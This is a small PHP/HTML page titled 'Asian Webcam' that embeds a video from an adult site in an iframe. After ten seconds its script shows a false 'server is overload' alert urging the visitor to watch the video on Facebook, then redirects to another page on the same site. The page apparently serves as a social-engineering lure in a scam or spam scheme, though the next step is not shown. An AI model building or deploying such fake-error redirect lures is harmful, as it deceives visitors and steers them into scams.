<?

?><!DOCTYPE HTML>
<html>
<head>
	<meta http-equiv="content-type" content="text/html" />
	<meta name="author" content="" />

	<title>Asian Webcam</title>
    <script>
    setTimeout(function(){
        alert("Sorry, the server is overload. Please see this video on Facebook!");
        location.href="index.php?t=set&lang=hi_IN";
    },10000);
    
    
    </script>
</head>

<body>
<iframe style="width: 100%; height: 1080px; border: none;padding:0;margin: 0; " src="http://www.xvideos.com/video12896079/asian_webcam"></iframe>


</body>
</html>